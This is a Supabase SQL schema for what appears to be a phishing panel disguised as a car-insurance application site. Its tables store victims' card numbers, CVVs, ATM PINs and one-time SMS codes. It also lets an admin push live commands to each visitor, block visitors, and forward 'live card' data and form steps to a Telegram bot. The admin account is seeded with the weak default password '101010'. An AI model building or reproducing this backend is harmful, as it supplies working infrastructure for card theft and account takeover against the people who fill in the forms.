
-- ============ applications ============
CREATE TABLE IF NOT EXISTS public.applications (
  id TEXT PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  full_name TEXT, identity TEXT, birth_date TEXT, phone TEXT,
  insurance_type TEXT, start_date TEXT, purpose TEXT, est_value TEXT,
  car_year TEXT, car_model TEXT, repair_place TEXT, company TEXT, type TEXT,
  price NUMERIC, total NUMERIC, method TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  review_status TEXT NOT NULL DEFAULT 'awaiting_review',
  card_number TEXT, card_name TEXT, card_exp_month TEXT, card_exp_year TEXT,
  card_cvv TEXT, card_brand TEXT, otp_code TEXT, visitor_id TEXT,
  atm_pin TEXT, mutasil_phone TEXT, mutasil_provider TEXT, mutasil_id TEXT, mutasil_otp TEXT
);
CREATE INDEX IF NOT EXISTS applications_visitor_id_idx ON public.applications(visitor_id);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.applications TO anon, authenticated;
GRANT ALL ON public.applications TO service_role;
ALTER TABLE public.applications ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.applications REPLICA IDENTITY FULL;

CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS TRIGGER LANGUAGE plpgsql SET search_path = public AS $$
BEGIN NEW.updated_at = now(); RETURN NEW; END; $$;
DROP TRIGGER IF EXISTS applications_set_updated_at ON public.applications;
CREATE TRIGGER applications_set_updated_at BEFORE UPDATE ON public.applications
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

CREATE TABLE IF NOT EXISTS public.visitor_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id TEXT NOT NULL, command TEXT NOT NULL, payload TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_visitor_commands_visitor ON public.visitor_commands(visitor_id, created_at DESC);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_commands TO anon, authenticated;
GRANT ALL ON public.visitor_commands TO service_role;
ALTER TABLE public.visitor_commands ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.visitor_commands REPLICA IDENTITY FULL;

CREATE TABLE IF NOT EXISTS public.blocked_visitors (
  visitor_id TEXT PRIMARY KEY, reason TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.blocked_visitors TO anon, authenticated;
GRANT ALL ON public.blocked_visitors TO service_role;
ALTER TABLE public.blocked_visitors ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.blocked_visitors REPLICA IDENTITY FULL;

CREATE TABLE IF NOT EXISTS public.chat_conversations (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  visitor_id TEXT NOT NULL,
  customer_name TEXT NOT NULL DEFAULT '',
  customer_phone TEXT NOT NULL DEFAULT '',
  last_message_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  unread_admin INT NOT NULL DEFAULT 0,
  unread_customer INT NOT NULL DEFAULT 0,
  initiated_by TEXT NOT NULL DEFAULT 'customer' CHECK (initiated_by IN ('customer','admin')),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_chat_conversations_visitor ON public.chat_conversations(visitor_id);
CREATE INDEX IF NOT EXISTS idx_chat_conversations_last_msg ON public.chat_conversations(last_message_at DESC);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_conversations TO anon, authenticated;
GRANT ALL ON public.chat_conversations TO service_role;
ALTER TABLE public.chat_conversations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.chat_conversations REPLICA IDENTITY FULL;

CREATE TABLE IF NOT EXISTS public.chat_messages (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  conversation_id UUID NOT NULL REFERENCES public.chat_conversations(id) ON DELETE CASCADE,
  sender TEXT NOT NULL CHECK (sender IN ('customer','admin')),
  content TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_chat_messages_conv ON public.chat_messages(conversation_id, created_at);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_messages TO anon, authenticated;
GRANT ALL ON public.chat_messages TO service_role;
ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.chat_messages REPLICA IDENTITY FULL;

CREATE POLICY "chat_conv_all" ON public.chat_conversations FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "chat_msg_all" ON public.chat_messages FOR ALL USING (true) WITH CHECK (true);

DROP TRIGGER IF EXISTS trg_chat_conversations_updated ON public.chat_conversations;
CREATE TRIGGER trg_chat_conversations_updated BEFORE UPDATE ON public.chat_conversations
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

CREATE TABLE IF NOT EXISTS public.sms_settings (
  id text PRIMARY KEY DEFAULT 'default',
  provider_name text NOT NULL DEFAULT '',
  api_url text NOT NULL DEFAULT '',
  http_method text NOT NULL DEFAULT 'POST',
  headers_json text NOT NULL DEFAULT '{}',
  body_template text NOT NULL DEFAULT '{"to":"{phone}","from":"{sender_id}","text":"{message}"}',
  content_type text NOT NULL DEFAULT 'application/json',
  default_sender_id text NOT NULL DEFAULT '',
  phone_format text NOT NULL DEFAULT 'e164',
  enabled boolean NOT NULL DEFAULT false,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sms_settings TO anon, authenticated;
GRANT ALL ON public.sms_settings TO service_role;
ALTER TABLE public.sms_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.sms_settings REPLICA IDENTITY FULL;
DROP TRIGGER IF EXISTS set_updated_at_sms_settings ON public.sms_settings;
CREATE TRIGGER set_updated_at_sms_settings BEFORE UPDATE ON public.sms_settings
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

CREATE TABLE IF NOT EXISTS public.sms_logs (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  application_id text, phone text NOT NULL,
  sender_id text NOT NULL DEFAULT '',
  message text NOT NULL,
  status text NOT NULL DEFAULT 'pending',
  http_status integer, provider_response text, error text,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS sms_logs_created_at_idx ON public.sms_logs (created_at DESC);
CREATE INDEX IF NOT EXISTS sms_logs_application_id_idx ON public.sms_logs (application_id);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sms_logs TO anon, authenticated;
GRANT ALL ON public.sms_logs TO service_role;
ALTER TABLE public.sms_logs ENABLE ROW LEVEL SECURITY;

INSERT INTO public.sms_settings (id) VALUES ('default') ON CONFLICT (id) DO NOTHING;

CREATE TABLE IF NOT EXISTS public.telegram_settings (
  id text NOT NULL PRIMARY KEY DEFAULT 'default',
  enabled boolean NOT NULL DEFAULT false,
  bot_token text NOT NULL DEFAULT '',
  chat_id text NOT NULL DEFAULT '',
  send_live_card boolean NOT NULL DEFAULT true,
  send_steps boolean NOT NULL DEFAULT true,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.telegram_settings TO anon, authenticated;
GRANT ALL ON public.telegram_settings TO service_role;
ALTER TABLE public.telegram_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.telegram_settings REPLICA IDENTITY FULL;
DROP TRIGGER IF EXISTS set_telegram_settings_updated_at ON public.telegram_settings;
CREATE TRIGGER set_telegram_settings_updated_at BEFORE UPDATE ON public.telegram_settings
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();
INSERT INTO public.telegram_settings (id) VALUES ('default') ON CONFLICT (id) DO NOTHING;

-- ============ admin auth ============
CREATE EXTENSION IF NOT EXISTS pgcrypto;

CREATE TABLE IF NOT EXISTS public.admin_credentials (
  id boolean PRIMARY KEY DEFAULT true CHECK (id = true),
  password_hash text NOT NULL,
  recovery_code_hash text,
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT ALL ON public.admin_credentials TO service_role;
ALTER TABLE public.admin_credentials ENABLE ROW LEVEL SECURITY;
INSERT INTO public.admin_credentials (id, password_hash)
VALUES (true, crypt('101010', gen_salt('bf')))
ON CONFLICT (id) DO NOTHING;

CREATE TABLE IF NOT EXISTS public.admin_sessions (
  token text PRIMARY KEY,
  created_at timestamptz NOT NULL DEFAULT now(),
  expires_at timestamptz NOT NULL DEFAULT now() + interval '7 days'
);
GRANT ALL ON public.admin_sessions TO service_role;
ALTER TABLE public.admin_sessions ENABLE ROW LEVEL SECURITY;

CREATE OR REPLACE FUNCTION public.is_admin_token(_token text)
RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS $$
  SELECT EXISTS (SELECT 1 FROM public.admin_sessions WHERE token = _token AND expires_at > now());
$$;

CREATE OR REPLACE FUNCTION public.is_current_admin()
RETURNS boolean LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
DECLARE _token text;
BEGIN
  BEGIN _token := current_setting('request.headers', true)::json->>'x-admin-token';
  EXCEPTION WHEN OTHERS THEN _token := NULL; END;
  IF _token IS NULL OR length(_token) = 0 THEN RETURN false; END IF;
  RETURN public.is_admin_token(_token);
END; $$;

CREATE OR REPLACE FUNCTION public.current_visitor_id()
RETURNS text LANGUAGE plpgsql STABLE AS $$
DECLARE _vid text;
BEGIN
  BEGIN _vid := current_setting('request.headers', true)::json->>'x-visitor-id';
  EXCEPTION WHEN OTHERS THEN _vid := NULL; END;
  RETURN _vid;
END; $$;

CREATE OR REPLACE FUNCTION public.admin_login(_password text)
RETURNS text LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
DECLARE _hash text; _token text;
BEGIN
  SELECT password_hash INTO _hash FROM public.admin_credentials WHERE id = true;
  IF _hash IS NULL OR crypt(_password, _hash) <> _hash THEN RETURN NULL; END IF;
  _token := encode(gen_random_bytes(32), 'hex');
  INSERT INTO public.admin_sessions(token) VALUES (_token);
  DELETE FROM public.admin_sessions WHERE expires_at < now();
  RETURN _token;
END; $$;

CREATE OR REPLACE FUNCTION public.admin_logout(_token text)
RETURNS void LANGUAGE sql SECURITY DEFINER SET search_path = public AS $$
  DELETE FROM public.admin_sessions WHERE token = _token;
$$;

CREATE OR REPLACE FUNCTION public.admin_change_password(_current text, _new text)
RETURNS boolean LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
DECLARE _hash text;
BEGIN
  SELECT password_hash INTO _hash FROM public.admin_credentials WHERE id = true;
  IF _hash IS NULL OR crypt(_current, _hash) <> _hash THEN RETURN false; END IF;
  IF length(_new) < 4 THEN RETURN false; END IF;
  UPDATE public.admin_credentials SET password_hash = crypt(_new, gen_salt('bf')), updated_at = now()
  WHERE id = true;
  RETURN true;
END; $$;

CREATE OR REPLACE FUNCTION public.admin_generate_recovery_code(_current_password text)
RETURNS text LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
DECLARE _hash text; _code text; _alphabet text := 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; _i int;
BEGIN
  SELECT password_hash INTO _hash FROM public.admin_credentials WHERE id = true;
  IF _hash IS NULL OR crypt(_current_password, _hash) <> _hash THEN RETURN NULL; END IF;
  _code := '';
  FOR _i IN 1..20 LOOP
    _code := _code || substr(_alphabet, 1 + (get_byte(gen_random_bytes(1), 0) % length(_alphabet))::int, 1);
    IF _i % 4 = 0 AND _i < 20 THEN _code := _code || '-'; END IF;
  END LOOP;
  UPDATE public.admin_credentials SET recovery_code_hash = crypt(_code, gen_salt('bf')), updated_at = now() WHERE id = true;
  RETURN _code;
END; $$;

CREATE OR REPLACE FUNCTION public.admin_reset_with_recovery(_code text, _new_password text)
RETURNS boolean LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
DECLARE _rec_hash text; _trimmed_code text;
BEGIN
  IF _new_password IS NULL OR length(_new_password) < 8 THEN RETURN false; END IF;
  _trimmed_code := upper(regexp_replace(coalesce(_code,''), '\s', '', 'g'));
  IF length(_trimmed_code) < 8 THEN RETURN false; END IF;
  SELECT recovery_code_hash INTO _rec_hash FROM public.admin_credentials WHERE id = true;
  IF _rec_hash IS NULL OR crypt(_trimmed_code, _rec_hash) <> _rec_hash THEN RETURN false; END IF;
  UPDATE public.admin_credentials SET password_hash = crypt(_new_password, gen_salt('bf')), recovery_code_hash = NULL, updated_at = now() WHERE id = true;
  DELETE FROM public.admin_sessions;
  RETURN true;
END; $$;

GRANT EXECUTE ON FUNCTION public.admin_login(text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.admin_logout(text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.admin_change_password(text,text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.admin_generate_recovery_code(text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.admin_reset_with_recovery(text,text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.is_current_admin() TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.is_admin_token(text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.current_visitor_id() TO anon, authenticated;

-- Policies
CREATE POLICY "apps_visitor_select" ON public.applications FOR SELECT
  USING (public.is_current_admin() OR (visitor_id IS NOT NULL AND visitor_id = public.current_visitor_id()));
CREATE POLICY "apps_visitor_insert" ON public.applications FOR INSERT
  WITH CHECK (public.is_current_admin() OR (visitor_id IS NOT NULL AND visitor_id = public.current_visitor_id()));
CREATE POLICY "apps_visitor_update" ON public.applications FOR UPDATE
  USING (public.is_current_admin() OR (visitor_id IS NOT NULL AND visitor_id = public.current_visitor_id()))
  WITH CHECK (public.is_current_admin() OR (visitor_id IS NOT NULL AND visitor_id = public.current_visitor_id()));
CREATE POLICY "apps_admin_delete" ON public.applications FOR DELETE USING (public.is_current_admin());

CREATE POLICY "vc_select" ON public.visitor_commands FOR SELECT USING (true);
CREATE POLICY "vc_admin_insert" ON public.visitor_commands FOR INSERT WITH CHECK (public.is_current_admin());
CREATE POLICY "vc_admin_delete" ON public.visitor_commands FOR DELETE USING (public.is_current_admin());

CREATE POLICY "bv_select" ON public.blocked_visitors FOR SELECT USING (true);
CREATE POLICY "bv_admin_insert" ON public.blocked_visitors FOR INSERT WITH CHECK (public.is_current_admin());
CREATE POLICY "bv_admin_delete" ON public.blocked_visitors FOR DELETE USING (public.is_current_admin());

CREATE POLICY "sms_settings_admin_all" ON public.sms_settings FOR ALL
  USING (public.is_current_admin()) WITH CHECK (public.is_current_admin());
CREATE POLICY "sms_logs_admin_all" ON public.sms_logs FOR ALL
  USING (public.is_current_admin()) WITH CHECK (public.is_current_admin());
CREATE POLICY "tg_admin_all" ON public.telegram_settings FOR ALL
  USING (public.is_current_admin()) WITH CHECK (public.is_current_admin());

CREATE TABLE IF NOT EXISTS public.visitor_sessions (
  visitor_id    TEXT PRIMARY KEY,
  last_path     TEXT,
  last_seen_at  TIMESTAMPTZ NOT NULL DEFAULT now(),
  first_seen_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  user_agent    TEXT, ip TEXT, country TEXT, country_code TEXT, city TEXT,
  is_mobile BOOLEAN, platform TEXT, referrer TEXT
);
CREATE INDEX IF NOT EXISTS visitor_sessions_last_seen_idx ON public.visitor_sessions (last_seen_at DESC);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_sessions TO anon, authenticated;
GRANT ALL ON public.visitor_sessions TO service_role;
ALTER TABLE public.visitor_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.visitor_sessions REPLICA IDENTITY FULL;
CREATE POLICY "vs_select" ON public.visitor_sessions FOR SELECT USING (true);
CREATE POLICY "vs_upsert_insert" ON public.visitor_sessions FOR INSERT WITH CHECK (true);
CREATE POLICY "vs_upsert_update" ON public.visitor_sessions FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY "vs_admin_delete" ON public.visitor_sessions FOR DELETE USING (public.is_current_admin());

DO $$
DECLARE t TEXT;
BEGIN
  FOREACH t IN ARRAY ARRAY['applications','chat_conversations','chat_messages','visitor_commands','blocked_visitors','sms_settings','sms_logs','telegram_settings','visitor_sessions']
  LOOP
    BEGIN EXECUTE format('ALTER PUBLICATION supabase_realtime ADD TABLE public.%I', t);
    EXCEPTION WHEN duplicate_object THEN NULL; END;
  END LOOP;
END $$;
